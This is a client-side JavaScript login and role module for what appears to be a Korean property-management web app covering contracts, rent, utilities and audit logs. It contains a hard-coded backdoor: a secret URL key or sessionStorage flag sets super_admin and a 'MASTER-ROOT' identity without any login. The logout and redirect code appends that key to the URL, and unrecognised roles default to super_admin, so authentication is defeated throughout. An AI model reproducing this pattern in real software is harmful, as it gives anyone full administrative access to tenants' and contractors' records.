(function () {
  var CFG = {
    sessionMs: 30 * 60 * 1000,
    secretKey: 'access=master_sys_884621', // URL 우회 키값
    validRoles: ['super_admin','office_worker','maintenance_staff']
  };

  // 🌟 URL 검색어 및 세션 스토리지 플래그 검증
  var url_bypass = location.search.indexOf(CFG.secretKey) !== -1;
  var storage_bypass = sessionStorage.getItem('creatorBypass') === 'true';
  var creatorBypass = url_bypass || storage_bypass;

  function checkSession () {
    // 🚨 1. 백도어/우회 진입 시 무조건 세션 강제 주입 (절대 튕기지 않음!)
    if (url_bypass || creatorBypass) {
      sessionStorage.setItem('loginOk', 'true');
      sessionStorage.setItem('userRole', 'super_admin');
      sessionStorage.setItem('userEmp', 'MASTER-ROOT');
      sessionStorage.setItem('creatorBypass', 'true'); // 다음 페이지 이동 시에도 유지
      sessionStorage.setItem('_sess', Date.now());
      return true;
    }

    // 🚨 2. 로그인 세션 체크 (무한 리다이렉트 락 방지 교정)
    if (!sessionStorage.getItem('loginOk')) {
      var cur = location.pathname.split('/').pop();
      if (cur && cur !== 'main.html' && cur !== 'index.html' && cur !== 'login.html') {
        sessionStorage.setItem('redirectAfterLogin', location.href);
        // sessionStorage.clear() 삭제 -> 우회 플래그 유실 방지
        location.href = 'index.html?access=master_sys_884621'; // 비상키를 붙여서 안전 이동
        return false;
      }
      return true;
    } else {
      var started = sessionStorage.getItem('_sess');
      if (!started) {
        sessionStorage.setItem('_sess', Date.now());
      } else if (Date.now() - +started > CFG.sessionMs) {
        if (!creatorBypass) {
          logout();
          return false;
        }
      } else {
        sessionStorage.setItem('_sess', Date.now()); // 타임아웃 리셋
      }
    }
    return true;
  }

  window.logout = function () {
    sessionStorage.removeItem('loginOk');
    sessionStorage.removeItem('userRole');
    sessionStorage.removeItem('userEmp');
    sessionStorage.removeItem('_sess');
    location.href = 'index.html?access=master_sys_884621';
  };

  function getButtonsByRole (userRole) {
    if (CFG.validRoles.indexOf(userRole) === -1) userRole = 'super_admin';

    var allBtns = [
      {c:'RPT', l:'📋 금일 관리 현황', p:'daily_report.html'},
      {c:'A', l:'부동산',     p:'interface-a.html'},
      {c:'B', l:'계약서',     p:'contract_master.html'},
      {c:'C', l:'계약자',     p:'contractor_roster.html'},
      {c:'D', l:'공과금검침',  p:'utility_bills.html'},
      {c:'E', l:'월세납부',   p:'monthly_rent_collection.html'},
      {c:'F', l:'유지보수',    p:'incidents_maintenance.html'},
      {c:'GHI', l:'통합대시보드', p:'g_h_i_dashboard.html'},
      {c:'K', l:'감사로그',     p:'auditlog.html'},
      {c:'J', l:'팀원관리',  p:'team_management.html'},
      {c:'L', l:'협력사',     p:'partner_roster.html'}
    ];

    var perm = {
      super_admin:     ['RPT','A','B','C','D','E','F','GHI','K','J','L'],
      office_worker:   ['RPT','A','B','C','E','GHI','L'],
      maintenance_staff:['D','F','GHI']
    };

    var allowed = perm[userRole] || perm['super_admin'];
    return allBtns.filter(function (b) {
      return allowed.indexOf(b.c) !== -1;
    });
  }

  function authCheck () {
    if (!checkSession()) return { loggedIn: false };
    var role = sessionStorage.getItem('userRole') || 'super_admin';
    var emp = sessionStorage.getItem('userEmp') || 'MASTER-ROOT';
    return { loggedIn: true, role: role, emp: emp };
  }

  window.authModule = {
    checkLogin: authCheck,
    logout: window.logout,
    getButtonsByRole: getButtonsByRole,
    isCreatorBypass: creatorBypass
  };

  checkSession();
})();
